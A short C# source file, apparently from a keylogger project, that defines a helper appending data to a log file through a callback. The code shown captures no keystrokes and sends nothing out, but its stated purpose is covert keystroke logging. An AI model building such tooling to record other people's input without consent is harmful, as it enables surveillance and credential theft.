using System;
using System.IO;
using System.Text;
using System.Windows.Input;
using System.Collections.Generic;

namespace keylogger.keylog
{
    public static class KeyLog
    {
        public static bool Log(string path, Action<StreamWriter> SaveKeys)
        {
            try
            {
                using (var sw = new StreamWriter(path, true, Encoding.UTF8))
                {
                    SaveKeys(sw);
                }
                return true;
            }
            catch (Exception e)
            {
                return false;
            }           
        }
    }
}